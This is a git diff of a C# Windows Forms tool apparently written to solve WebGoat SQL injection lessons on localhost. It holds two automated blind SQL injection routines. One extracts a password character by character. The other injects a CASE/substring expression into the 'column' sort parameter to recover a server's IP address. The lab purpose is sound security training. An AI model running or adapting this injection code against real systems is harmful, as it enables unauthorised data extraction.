@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Microsoft.Win32;
@@ -7,9 +7,6 @@ namespace WebGoatFuzzer
 {
     public partial class Form1 : Form
     {
-        public static int curPosition = 1;
-        public static string password = "";
-
         public Form1()
         {
             InitializeComponent();
@@ -41,11 +38,14 @@ namespace WebGoatFuzzer
             wbWebGoat.Navigate("http://localhost:8080/WebGoat/");
         }
 
-        private async void btnStart_Click(object sender, EventArgs e)
+        private async void btnAdvanced_Click(object sender, EventArgs e)
         {
             wbWebGoat.Navigate("http://localhost:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/4");
 
-            await Task.Delay(2000);
+            await Task.Delay(1000);
+
+            int curPosition = 1;
+            string password = "";
 
             while (password.Length < 23)
             {
@@ -87,9 +87,41 @@ namespace WebGoatFuzzer
                     }
                 }
 
-                password += Convert.ToChar(min+1);
+                password += Convert.ToChar(min + 1);
                 txtPassword.Text = password;
 
+                curPosition++;
+            }
+        }
+
+        private async void btnMigitation_Click(object sender, EventArgs e)
+        {
+            char[] ipChars = { '1', '2', '3', '4', '5', '6', '7', '8', '9', '1', '0', '.' };
+            string ipAddress = "";
+            int curPosition = 1;
+
+            while (curPosition < 16)
+            {
+                int curChar = 0;
+
+                while (curChar < ipChars.Length)
+                {
+                    string url = $"http://localhost:8080/WebGoat/SqlInjection/servers?column=" +
+                                 $"(case when exists(select id from servers where hostname='webgoat-prd' and " +
+                                 $"substring(ip,{curPosition},1)='{ipChars[curChar]}') then ip else hostname end)";
+
+                    wbWebGoat.Navigate(url);
+                    await Task.Delay(500);
+
+                    if (wbWebGoat.Document.Body.InnerText.StartsWith("[ {\r\n  \"id\" : \"2\""))
+                    {
+                        ipAddress += ipChars[curChar];
+                        txtIP.Text = ipAddress;
+                        break;
+                    }
+
+                    curChar++;
+                }
                 curPosition++;
             }
         }
